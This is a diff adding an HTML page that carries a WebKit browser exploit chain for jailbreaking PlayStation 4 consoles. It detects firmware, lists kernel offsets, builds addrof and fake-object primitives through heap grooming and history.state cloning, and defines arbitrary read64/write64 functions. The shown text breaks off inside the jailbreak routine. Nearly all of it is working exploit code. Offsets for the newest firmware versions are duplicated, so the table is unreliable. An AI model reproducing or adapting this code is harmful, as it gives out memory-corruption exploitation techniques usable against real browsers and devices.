@@ -1,0 +1,884 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>WebKit Exploit</title>
+<style>
+body {
+    background: #ffffff;
+    color: #000000;
+    font: 13px 'Courier New', monospace;
+    margin: 20px;
+    padding: 0;
+}
+#out {
+    white-space: pre-wrap;
+    word-wrap: break-word;
+    max-width: 900px;
+}
+.highlight {
+    color: #cc0000;
+    font-weight: bold;
+}
+</style>
+</head>
+<body>
+<pre id="out"></pre>
+
+<script>
+"use strict";
+
+// ========== HEADER MESSAGE ==========
+var headerMsg = "mansoor0x";
+var headerBorder = "=".repeat(50);
+var headerPrinted = false;
+
+function printHeader() {
+    if (headerPrinted) return;
+    headerPrinted = true;
+    try {
+        var el = document.getElementById("out");
+        el.textContent += headerBorder + "\n";
+        el.textContent += " " + headerMsg + "\n";
+        el.textContent += headerBorder + "\n";
+    } catch (_) {}
+}
+
+// ========== PS4 OFFSETS ==========
+var PS4_OFFSETS = {
+    "5.00": { evf: 0x7B3ED4, prison0: 0x10986A0, rootvnode: 0x22C19F0, sysent: 0x1084200, jmp: 0x13460 },
+    "5.03": { evf: 0x7B42E4, prison0: 0x10986A0, rootvnode: 0x22C1A70, sysent: 0x1084200, jmp: 0x13460 },
+    "5.50": { evf: 0x80EF12, prison0: 0x1134180, rootvnode: 0x22EF570, sysent: 0x111D8B0, jmp: 0xAF8C },
+    "5.53": { evf: 0x80EDE2, prison0: 0x1134180, rootvnode: 0x22EF570, sysent: 0x111D8B0, jmp: 0xAF8C },
+    "5.55": { evf: 0x80F482, prison0: 0x1139180, rootvnode: 0x22F3570, sysent: 0x11228B0, jmp: 0xAF8C },
+    "5.56": { evf: 0x7C8971, prison0: 0x1139180, rootvnode: 0x22F3570, sysent: 0x1123130, jmp: 0x3F0C9 },
+    "6.00": { evf: 0x7C8971, prison0: 0x1139458, rootvnode: 0x21BFAC0, sysent: 0x1123130, jmp: 0x3F0C9 },
+    "6.20": { evf: 0x7C8E31, prison0: 0x113D458, rootvnode: 0x21C3AC0, sysent: 0x1127130, jmp: 0x2BE6E },
+    "6.50": { evf: 0x7C6019, prison0: 0x113D4F8, rootvnode: 0x2300320, sysent: 0x1124BF0, jmp: 0x15A50D },
+    "6.70": { evf: 0x7C7829, prison0: 0x113E518, rootvnode: 0x2300320, sysent: 0x1125BF0, jmp: 0x9D11D },
+    "7.00": { evf: 0x7F92CB, prison0: 0x113E398, rootvnode: 0x22C5750, sysent: 0x112D250, jmp: 0x6B192 },
+    "7.50": { evf: 0x79A92E, prison0: 0x113B728, rootvnode: 0x1B463E0, sysent: 0x1129F30, jmp: 0x1F842 },
+    "8.00": { evf: 0x7EDCFF, prison0: 0x111A7D0, rootvnode: 0x1B8C730, sysent: 0x11040C0, jmp: 0xE629C },
+    "8.50": { evf: 0x7DA91C, prison0: 0x111A8F0, rootvnode: 0x1C66150, sysent: 0x11041B0, jmp: 0xC810D },
+    "9.00": { evf: 0x7F6F27, prison0: 0x111F870, rootvnode: 0x21EFF20, sysent: 0x1107F00, jmp: 0x4C7AD },
+    "9.03": { evf: 0x7F4CE7, prison0: 0x111B840, rootvnode: 0x21EBF20, sysent: 0x1103F00, jmp: 0x5325B },
+    "9.50": { evf: 0x769A88, prison0: 0x11137D0, rootvnode: 0x21A6C30, sysent: 0x1100EE0, jmp: 0x15A6D },
+    "10.00": { evf: 0x7B5133, prison0: 0x111B8B0, rootvnode: 0x1B25BD0, sysent: 0x110A980, jmp: 0x68B1 },
+    "10.50": { evf: 0x7A7B14, prison0: 0x111B910, rootvnode: 0x1BF81F0, sysent: 0x110A5B0, jmp: 0x50DED },
+    "11.00": { evf: 0x7FC26F, prison0: 0x111F830, rootvnode: 0x2116640, sysent: 0x1109350, jmp: 0x71A21 },
+    "11.02": { evf: 0x7FC22F, prison0: 0x111F830, rootvnode: 0x2116640, sysent: 0x1109350, jmp: 0x71A21 },
+    "11.50": { evf: 0x784318, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x704D5 },
+    "12.00": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "12.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.00": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.02": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.04": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.50": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 },
+    "13.52": { evf: 0x784798, prison0: 0x111FA18, rootvnode: 0x2136E90, sysent: 0x110A760, jmp: 0x47B31 }
+};
+
+// ========== PARAMETERS ==========
+var Q = new URLSearchParams(location.search);
+var requestedDrain = parseInt(Q.get("n") || "128", 10);
+var DRAIN_COUNT = isFinite(requestedDrain) ? Math.max(64, Math.min(1024, requestedDrain)) : 512;
+var LITE = Q.get("l") === "1";
+
+var REVISION = "genuine-u8-rw-3-1352";
+var MAX_ATTEMPTS = 10;
+var attemptNumber = 0;
+var K = 2;
+var DUPLICATE_INDEX = 2;
+var CONTROL_INDEX = 0xffff;
+var CONTROL_INT = -64000;
+var FILLER_BIGINTS = K - 1;
+var FILLER_OBJECTS = 0xfffe - K;
+var EXPECTED_LENGTH = 0x50001;
+var CELL_BYTES = 0x30;
+
+var CARRIER_SLOTS = 4500000;
+var CARRIER_BYTES = CARRIER_SLOTS * 8;
+var CAPTURE_DELAY_MS = 3000;
+var COMPOSE_DELAY_MS = 6500;
+var symbolToString = Symbol.prototype.toString;
+
+var DRAIN_SIZE = 0x10000;
+var SLAB_SIZE = 0x400000;
+var BUTTERFLY_HOLE_SIZE = 0x81000;
+var SEPARATOR_SIZE = 0x10000;
+var EARLY_HOLE_SIZE = 0x70000;
+var GUARD_SIZE = 0x90000;
+var PREDECESSOR_SIZE = 0x80000;
+var FINAL_HOLE_SIZE = 0x80000;
+
+var seq = 0;
+var referenceTarget = null;
+var rwBuffer = null;
+var rwView = null;
+var rwMirror = null;
+var targetBuffer = null;
+var targetView = null;
+var fakeHost = null;
+var lengthWord = null;
+var fillerGraph = null;
+var outerGraph = null;
+
+var leakedScope = null;
+var getterCarrier = null;
+var preparedSymbolObject = null;
+var capturedString = null;
+var capturedWords = null;
+var copiedLength = 0;
+var captureState = 0;
+var captureError = null;
+var hostAddress = NaN;
+var fakeAddress = NaN;
+
+var keepAlive = new Array(DRAIN_COUNT + 3);
+var keepIndex = 0;
+var predecessorWords = null;
+var pointerLow = 0;
+var pointerHigh = 0;
+var targetAddress = NaN;
+var targetAddressLow = 0;
+var targetAddressHigh = 0;
+
+var rwHeader = new Uint8Array(CELL_BYTES);
+var targetHeader = new Uint8Array(CELL_BYTES);
+var scratchBits = new ArrayBuffer(8);
+var scratchBytes = new Uint8Array(scratchBits);
+var scratchWords = new Uint32Array(scratchBits);
+var scratchDouble = new Float64Array(scratchBits);
+
+var rwOriginalVector = NaN;
+var targetVector = NaN;
+var rwHeaderOK = false;
+var targetHeaderOK = false;
+var readObserved = false;
+var writeObserved = false;
+var restoreObserved = false;
+var retrySafe = false;
+
+var compositionState = 0;
+var compositionLength = 0;
+var compositionError = null;
+
+var globalFakeArray = null;
+var testRun = false;
+
+// ========== FIRMWARE DETECTION ==========
+var FW_LABEL = (function() {
+    var m = /PlayStation 4\/(\d+)\.(\d+)/.exec(navigator.userAgent);
+    if (m) return m[1] + "." + m[2].padStart(2, "0");
+    var ua = navigator.userAgent;
+    var match = ua.match(/PS4\s+Update\s+\((\d+)\.(\d+)\)/);
+    if (match) return match[1] + "." + match[2].padStart(2, "0");
+    return "";
+})();
+
+var fwOffsets = PS4_OFFSETS[FW_LABEL] || PS4_OFFSETS[""];
+
+// ========== UTILITY ==========
+function mark(tag, extra) {
+    if (!headerPrinted) printHeader();
+    seq++;
+    var line = seq + "-rw-" + tag + (extra !== undefined ? "-" + extra : "");
+    try {
+        var el = document.getElementById("out");
+        if (tag === "GENUINE-UB-RW-PASS" || tag === "===== JAILBREAK COMPLETE =====") {
+            var span = document.createElement("span");
+            span.className = "highlight";
+            span.textContent = line + "\n";
+            el.appendChild(span);
+        } else {
+            el.textContent += line + "\n";
+        }
+    } catch (_) {}
+}
+
+function hex(value) {
+    return "0x" + value.toString(16);
+}
+
+function buffer(size) {
+    return new ArrayBuffer(size);
+}
+
+function uint32At(bytes, offset) {
+    return bytes[offset] + bytes[offset+1]*0x100 + bytes[offset+2]*0x10000 + bytes[offset+3]*0x1000000;
+}
+
+function plausibleCell(value) {
+    return value > 0x100000000 && value <= 0xffffffffffff && value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
+}
+
+function pointerFromWords(words, offset) {
+    if (words[offset+3] !== 0) return NaN;
+    return words[offset] + words[offset+1]*0x10000 + words[offset+2]*0x100000000;
+}
+
+function encodedHeaderNumber() {
+    var raw = new ArrayBuffer(8);
+    var u32 = new Uint32Array(raw);
+    var f64 = new Float64Array(raw);
+    u32[0] = 0x00004250;
+    u32[1] = 0x01062800;
+    return f64[0];
+}
+
+function leakScopeObject() {
+    class Leaker { leak() { return super.foo; } }
+    Leaker.prototype.__proto__ = new Proxy({}, {
+        get: function(target, property, receiver) { return receiver; }
+    });
+    var leak = Leaker.prototype.leak;
+    return (function() { return leak(); })();
+}
+
+function prepareSymbolWrapper(F) {
+    leakedScope = leakScopeObject();
+    if (leakedScope === undefined || leakedScope === null) throw new Error("scope-not-leaked");
+    for (var i = 0; i < 512; i++) leakedScope["p"+i] = i;
+    for (var j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
+    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
+    return Object(leakedScope.g);
+}
+
+// ========== EXPLOIT CORE ==========
+function buildFakeHost() {
+    rwBuffer = new ArrayBuffer(0x100);
+    rwView = new Uint8Array(rwBuffer);
+    rwMirror = new Uint8Array(rwBuffer);
+    rwMirror[0] = 0x3c;
+
+    targetBuffer = new ArrayBuffer(0x20);
+    targetView = new Uint8Array(targetBuffer);
+    targetView[0] = 0xa5;
+    lengthWord = { keep: 0x51515151 };
+
+    fakeHost = {
+        q0: encodedHeaderNumber(),
+        q1: 1.1,
+        q2: rwView,
+        q3: lengthWord,
+        q4: 2.2,
+        q5: 3.3
+    };
+
+    delete fakeHost.q1;
+    delete fakeHost.q4;
+    delete fakeHost.q5;
+
+    if (!isFinite(fakeHost.q0) || fakeHost.q2 !== rwView || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c || targetView[0] !== 0xa5)
+        throw new Error("fake-host-shape-failed");
+}
+
+function buildAndStoreGraph() {
+    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
+    buildFakeHost();
+
+    mark("SSV-BUILD", "k=" + K + "-n=" + DRAIN_COUNT);
+    fillerGraph = new Array(0xfffd);
+    var pos = 0;
+    var huge = 1n << 40n;
+    for (var b = 0; b < FILLER_BIGINTS; ++b) fillerGraph[pos++] = huge + BigInt(b);
+    for (var o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
+
+    outerGraph = new Array(CONTROL_INDEX + 1);
+    outerGraph[0] = fillerGraph;
+    outerGraph[1] = referenceTarget;
+    outerGraph[2] = referenceTarget;
+    outerGraph[CONTROL_INDEX] = CONTROL_INT;
+    mark("SSV-BUILT", "duplicate-index=" + DUPLICATE_INDEX);
+
+    mark("SSV-STORE-ENTER", "writer-ref=0x" + (0x10000 - K).toString(16));
+    history.replaceState(outerGraph, "");
+    mark("SSV-STORED", "fake-host-rw-target-not-serialized");
+}
+
+function prepareAddrof() {
+    capturedWords = new Uint16Array(16);
+    getterCarrier = function getterCarrierFunction() { return 7; };
+
+    mark("ADDROF-PREP-BEGIN", "slots=" + CARRIER_SLOTS + "-bytes=" + CARRIER_BYTES);
+    getterCarrier[0] = fakeHost;
+    for (var i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
+    getterCarrier[1] = targetView;
+    getterCarrier[2] = fakeHost;
+    getterCarrier[3] = targetView;
+    mark("ADDROF-CARRIER-DONE", "host-target-host-target");
+
+    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
+    mark("ADDROF-WRAPPER-READY", "wait=" + CAPTURE_DELAY_MS + "ms");
+
+    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
+    setTimeout(beginComposition, COMPOSE_DELAY_MS);
+}
+
+function runAddrofCapture() {
+    try {
+        capturedString = symbolToString.call(preparedSymbolObject);
+        copiedLength = capturedString.length;
+        for (var i = 0; i < 16; i++) capturedWords[i] = capturedString.charCodeAt(7 + i);
+        captureState = 1;
+    } catch (error) {
+        captureError = error;
+        captureState = -1;
+    }
+}
+
+function fillRawCellPointers(backing, pointer) {
+    pointerHigh = Math.floor(pointer / 0x100000000);
+    pointerLow = pointer - pointerHigh * 0x100000000;
+
+    if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 0xffff || Math.floor(pointerLow) !== pointerLow || pointerLow < 0 || pointerLow > 0xffffffff || pointerLow + pointerHigh * 0x100000000 !== pointer)
+        throw new Error("invalid-low48-fake-address");
+
+    predecessorWords = new Uint32Array(backing);
+    for (var i = 0; i < predecessorWords.length; i += 2) {
+        predecessorWords[i] = pointerLow;
+        predecessorWords[i+1] = pointerHigh;
+    }
+
+    var last = predecessorWords.length - 2;
+    if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh || predecessorWords[last] !== pointerLow || predecessorWords[last+1] !== pointerHigh)
+        throw new Error("pointer-fill-verification-failed");
+}
+
+function clearPredecessor() {
+    if (predecessorWords !== null) predecessorWords.fill(0);
+}
+
+function loadHistoryCritical() {
+    var result = null;
+    var candidate = null;
+    var rwHeaderCaptured = false;
+    var rwVectorTouched = false;
+    try {
+        result = history.state;
+        compositionLength = result.length;
+
+        if (compositionLength !== EXPECTED_LENGTH) {
+            result[DUPLICATE_INDEX] = undefined;
+            result = null;
+            clearPredecessor();
+            retrySafe = true;
+            compositionState = 3;
+            return;
+        }
+
+        if (result[1] === result[DUPLICATE_INDEX]) {
+            result[DUPLICATE_INDEX] = undefined;
+            candidate = null;
+            result = null;
+            clearPredecessor();
+            retrySafe = true;
+            compositionState = 2;
+            return;
+        }
+
+        candidate = result[DUPLICATE_INDEX];
+        result[DUPLICATE_INDEX] = undefined;
+        result = null;
+
+        for (var i = 0; i < CELL_BYTES; ++i) rwHeader[i] = candidate[i];
+        rwHeaderCaptured = true;
+
+        var rwSID = uint32At(rwHeader, 0);
+        var rwHeaderHigh = uint32At(rwHeader, 4);
+        var rwButterfly = rwHeader[8] + rwHeader[9]*0x100 + rwHeader[10]*0x10000 + rwHeader[11]*0x1000000 + rwHeader[12]*0x100000000 + rwHeader[13]*0x10000000000;
+        var rwVectorLow = uint32At(rwHeader, 0x10);
+        var rwVectorHigh = rwHeader[0x14] + rwHeader[0x15]*0x100;
+        rwOriginalVector = rwVectorLow + rwVectorHigh*0x100000000;
+
+        var rwOffsetZero = true;
+        for (var rz = 0x20; rz < 0x28; ++rz) { if (rwHeader[rz] !== 0) rwOffsetZero = false; }
+        rwHeaderOK = rwSID >= 0x4000 && rwSID < 0x08000000 && (rwSID & 0xf) === 0 && rwHeader[4] === 0 && rwHeader[5] === 0x28 && rwHeader[6] === 0x08 && (rwHeader[7] === 0 || rwHeader[7] === 1) && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0 && rwButterfly > 0x100000000 && rwButterfly % 8 === 0 && rwHeader[0x16] === 0 && rwHeader[0x17] === 0 && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0 && rwHeader[0x18] === 0 && rwHeader[0x19] === 1 && rwHeader[0x1a] === 0 && rwHeader[0x1b] === 0 && rwHeader[0x1c] === 0 && rwHeader[0x1d] === 0 && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0 && rwOffsetZero && rwHeader[0x28] === 0x58;
+
+        if (!rwHeaderOK) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = rwSID;
+        scratchWords[1] = (rwHeaderHigh - 0x00020000) >>> 0;
+        var upgradedHeader = scratchDouble[0];
+        var upgradedFinite = upgradedHeader === upgradedHeader && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
+        if (!upgradedFinite) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+        fakeHost.q0 = upgradedHeader;
+        if (fakeHost.q0 !== upgradedHeader) {
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = targetAddressLow;
+        scratchWords[1] = targetAddressHigh;
+        rwVectorTouched = true;
+        for (var w1 = 0; w1 < 8; ++w1) candidate[0x10 + w1] = scratchBytes[w1];
+
+        for (var j = 0; j < CELL_BYTES; ++j) targetHeader[j] = rwView[j];
+
+        var targetSID = uint32At(targetHeader, 0);
+        var targetButterfly = targetHeader[8] + targetHeader[9]*0x100 + targetHeader[10]*0x10000 + targetHeader[11]*0x1000000 + targetHeader[12]*0x100000000 + targetHeader[13]*0x10000000000;
+        var targetVectorLow = uint32At(targetHeader, 0x10);
+        var targetVectorHigh = targetHeader[0x14] + targetHeader[0x15]*0x100;
+        targetVector = targetVectorLow + targetVectorHigh*0x100000000;
+
+        var targetOffsetZero = true;
+        for (var tz = 0x20; tz < 0x28; ++tz) { if (targetHeader[tz] !== 0) targetOffsetZero = false; }
+        targetHeaderOK = targetSID === rwSID && targetHeader[4] === 0 && targetHeader[5] === 0x28 && targetHeader[6] === 0x08 && (targetHeader[7] === 0 || targetHeader[7] === 1) && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0 && targetButterfly > 0x100000000 && targetButterfly % 8 === 0 && targetHeader[0x16] === 0 && targetHeader[0x17] === 0 && targetVector > 0x100000000 && targetVector % 8 === 0 && targetHeader[0x18] === 0x20 && targetHeader[0x19] === 0 && targetHeader[0x1a] === 0 && targetHeader[0x1b] === 0 && targetHeader[0x1c] === 0 && targetHeader[0x1d] === 0 && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0 && targetOffsetZero && targetHeader[0x28] === 0x58;
+
+        if (!targetHeaderOK) {
+            for (var r1 = 0; r1 < 8; ++r1) candidate[0x10 + r1] = rwHeader[0x10 + r1];
+            rwVectorTouched = false;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+
+        scratchWords[0] = targetVectorLow;
+        scratchWords[1] = targetVectorHigh;
+        for (var w2 = 0; w2 < 8; ++w2) candidate[0x10 + w2] = scratchBytes[w2];
+
+        readObserved = rwView[0] === 0xa5 && targetView[0] === 0xa5;
+        if (!readObserved) {
+            for (var rRead = 0; rRead < 8; ++rRead) candidate[0x10 + rRead] = rwHeader[0x10 + rRead];
+            rwVectorTouched = false;
+            targetView[0] = 0xa5;
+            rwMirror[0] = 0x3c;
+            candidate = null;
+            clearPredecessor();
+            compositionState = 3;
+            return;
+        }
+        rwView[0] = 0x5a;
+        writeObserved = rwView[0] === 0x5a && targetView[0] === 0x5a;
+        rwView[0] = 0xa5;
+
+        if (readObserved && writeObserved) {
+            globalFakeArray = candidate;
+            mark("FAKE-RETAINED", "candidate-conserved-on-vector-modification");
+        }
+
+        for (var r2 = 0; r2 < 8; ++r2) candidate[0x10 + r2] = rwHeader[0x10 + r2];
+        rwVectorTouched = false;
+        targetView[0] = 0xa5;
+        rwMirror[0] = 0x3c;
+        restoreObserved = rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
+
+        candidate = null;
+        clearPredecessor();
+        compositionState = 1;
+    } catch (error) {
+        retrySafe = candidate === null && result === null && !rwHeaderCaptured && error && error.name === "TypeError";
+        if (result !== null) { try { result[DUPLICATE_INDEX] = undefined; } catch (_) {} }
+        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
+            try { for (var rr = 0; rr < 8; ++rr) candidate[0x10 + rr] = rwHeader[0x10 + rr]; } catch (_) {}
+        }
+        candidate = null;
+        result = null;
+        try { targetView[0] = 0xa5; } catch (_) {}
+        try { rwMirror[0] = 0x3c; } catch (_) {}
+        try { clearPredecessor(); } catch (_) {}
+        compositionError = error;
+        compositionState = -1;
+    }
+}
+
+function dumpHex(bytes) {
+    var out = "";
+    for (var i = 0; i < CELL_BYTES; ++i) out += (bytes[i] < 16 ? "0" : "") + bytes[i].toString(16);
+    return out;
+}
+
+function reportComposition() {
+    if (compositionState < 0) {
+        mark(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW", (compositionError && compositionError.name) + ":" + String(compositionError && compositionError.message).slice(0, 80));
+        mark("DONE-THROW", "predecessor-cleared=true");
+        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
+        setTimeout(function() { mark("SURVIVED-THROW-T1000"); }, 1000);
+        scheduleRetry(retrySafe ? "placement-miss" : "load-threw");
+        return;
+    }
+
+    if (compositionState === 2) {
+        mark("NORMAL-CLONE-MISS", "known-reference-returned=true");
+        mark("DONE-MISS", "predecessor-cleared=true");
+        setTimeout(function() { mark("SURVIVED-MISS-T1000"); }, 1000);
+        scheduleRetry("clone-miss");
+        return;
+    }
+
+    if (compositionState === 3) {
+        mark("HEADER-MISMATCH", "rw=" + rwHeaderOK + "-target=" + targetHeaderOK + "-carrier-restored=true");
+        mark("RW-HEADER-HEX", dumpHex(rwHeader));
+        mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
+        if (!retrySafe) { try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {} }
+        setTimeout(function() { mark("SURVIVED-MISMATCH-T1000"); }, 1000);
+        scheduleRetry("header-mismatch");
+        return;
+    }
+
+    if (compositionState === 0) {
+        mark("NO-RESULT", "critical-load-did-not-finish");
+        scheduleRetry("no-result");
+        return;
+    }
+
+    mark("SSV-RETURNED-CLEARED", "length=" + compositionLength + "-predecessor-cleared=true");
+    mark("RW-CARRIER", "slid=" + hex(uint32At(rwHeader, 0)) + "-vendor=" + hex(rwOriginalVector) + "-length=0x100-mode=0x" + rwHeader[0x28].toString(16));
+    mark("TARGET-CELL", "P=" + hex(targetAddress) + "-slid=" + hex(uint32At(targetHeader, 0)) + "-length=0x100-mode=0x" + targetHeader[0x28].toString(16));
+    mark("RW-HEADER-HEX", dumpHex(rwHeader));
+    mark("TARGET-HEADER-HEX", dumpHex(targetHeader));
+
+    var readPass = rwHeaderOK && targetHeaderOK && readObserved && compositionLength === EXPECTED_LENGTH;
+    var writePass = writeObserved && restoreObserved;
+    try { sessionStorage.setItem(REVISION + ":blocked", "1"); } catch (_) {}
+    if (readPass) mark("ARBITRARY-READ-PASS", "target=owned-live-cell-and-backing");
+    else mark("ARBITRARY-READ-MISMATCH", "rw-header=" + rwHeaderOK + "-target-header=" + targetHeaderOK + "-observed=" + readObserved + "-clone-length=" + (compositionLength === EXPECTED_LENGTH));
+
+    if (writePass) mark("ARBITRARY-WRITE-PASS", "as-to-as-to-as-restored=true");
+    else mark("ARBITRARY-WRITE-MISMATCH", "write=" + writeObserved + "-restore=" + restoreObserved);
+
+    if (readPass && writePass) {
+        attemptSucceeded = true;
+        mark("GENUINE-UB-RW-PASS", "carrier-vector-restored=true");
+        try { sessionStorage.setItem(REVISION + ":passed", "1"); } catch (_) {}
+        if (!testRun) {
+            testRun = true;
+            setTimeout(runJailbreak, 500);
+        }
+    }
+
+    mark("ROOTS-LIVE", "rw-byte=" + rwView[0].toString(16) + "-target-byte=" + targetView[0].toString(16) + "-length-word=" + lengthWord.keep.toString(16));
+    setTimeout(function() { mark("SURVIVED-T100"); }, 100);
+    setTimeout(function() { mark("SURVIVED-T1000"); }, 1000);
+    setTimeout(function() { mark("SURVIVED-T3000"); }, 3000);
+    if (!attemptSucceeded) scheduleRetry("rw-verify-miss");
+}
+
+function runGroomAndLoad() {
+    try {
+        mark("SSV-GROOM-ENTER", "n=" + DRAIN_COUNT);
+        var channel = new MessageChannel();
+        channel.port1.close();
+        channel.port2.close();
+
+        for (var i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
+
+        var slab = buffer(SLAB_SIZE);
+        channel.port1.postMessage(0, [slab]);
+        slab = null;
+
+        var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
+        var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
+        var separator = buffer(SEPARATOR_SIZE);
+        var earlyHole = buffer(EARLY_HOLE_SIZE);
+        var guard = buffer(GUARD_SIZE);
+        var predecessor = buffer(PREDECESSOR_SIZE);
+        var finalHole = buffer(FINAL_HOLE_SIZE);
+
+        fillRawCellPointers(predecessor, fakeAddress);
+        keepAlive[keepIndex++] = separator;
+        keepAlive[keepIndex++] = guard;
+        keepAlive[keepIndex++] = predecessor;
+        mark("PREDECESSOR-FILLED", "qwords=" + (PREDECESSOR_SIZE / 8) + "-fake=" + hex(fakeAddress));
+
+        channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
+        loadHistoryCritical();
+    } catch (error) {
+        try { clearPredecessor(); } catch (_) {}
+        compositionError = error;
+        compositionState = -1;
+    }
+    reportComposition();
+}
+
+function beginComposition() {
+    if (captureState === 0) {
+        mark("ADDROF-NO-RESULT", "capture-task-did-not-finish");
+        scheduleRetry("addrof-no-result");
+        return;
+    }
+    if (captureState < 0) {
+        mark("ADDROF-THREW", (captureError && captureError.name) + ":" + String(captureError && captureError.message).slice(0, 80));
+        scheduleRetry("addrof-threw");
+        return;
+    }
+
+    var a0 = pointerFromWords(capturedWords, 0);
+    var b0 = pointerFromWords(capturedWords, 4);
+    var a1 = pointerFromWords(capturedWords, 8);
+    var b1 = pointerFromWords(capturedWords, 12);
+    var repeated = a0 === a1 && b0 === b1;
+    var distinct = a0 !== b0;
+    var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
+    var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
+    var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+
+    mark("ADDROF-RETURNED", REVISION);
+    mark("ADDROF-COPY", "chars=" + copiedLength + "-source-covered=" + sourceCovered);
+    mark("ADDROF-POINTERS", "HOST=" + hex(a0) + "-TARGET=" + hex(b0) + "-HOST2=" + hex(a1) + "-TARGET2=" + hex(b1));
+
+    if (!(repeated && distinct && plausible && sourceCovered)) {
+        mark("ADDROF-FAIL", "repeat=" + repeated + "-distinct=" + distinct + "-plausible=" + plausible + "-covered=" + sourceCovered);
+        scheduleRetry("addrof-fail");
+        return;
+    }
+
+    hostAddress = a0;
+    targetAddress = b0;
+    targetAddressHigh = Math.floor(targetAddress / 0x100000000);
+    targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
+    if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
+        mark("TARGET-ADDRESS-FAIL", "target=" + hex(targetAddress));
+        scheduleRetry("target-addr-fail");
+        return;
+    }
+    fakeAddress = hostAddress + 0x10;
+    if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
+        mark("FAKE-ADDRESS-FAIL", "host=" + hex(hostAddress));
+        scheduleRetry("fake-addr-fail");
+        return;
+    }
+    mark("FAKE-ADDRESS", "host=" + hex(hostAddress) + "-fake=" + hex(fakeAddress) + "-delta=0x10");
+    runGroomAndLoad();
+}
+
+// ========== R/W PRIMITIVES ==========
+function read64(addr) {
+    if (!globalFakeArray) return 0n;
+    var oldVec = [];
+    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
+
+    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
+    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
+    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
+    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;
+
+    var val = 0n;
+    for (var i = 0; i < 8; i++) val |= BigInt(globalFakeArray[i]) << BigInt(i*8);
+
+    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
+    return val;
+}
+
+function write64(addr, value) {
+    if (!globalFakeArray) return;
+    var oldVec = [];
+    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];
+
+    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
+    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
+    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
+    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;
+
+    var v = BigInt(value);
+    for (var i = 0; i < 8; i++) globalFakeArray[i] = Number((v >> BigInt(i*8)) & 0xFFn);
+
+    for (var i = 0; i < 8; i++) globalFakeArray[0x10 + i] = oldVec[i];
+}
+
+// ========== PS4 JAILBREAK ==========
+function runJailbreak() {
+    mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);
+
+    try {
+        var evf = fwOffsets.evf;
+        var prison0 = fwOffsets.prison0;
+        var rootvnode = fwOffsets.rootvnode;
+        var sysent = fwOffsets.sysent;
+        var jmp = fwOffsets.jmp;
+
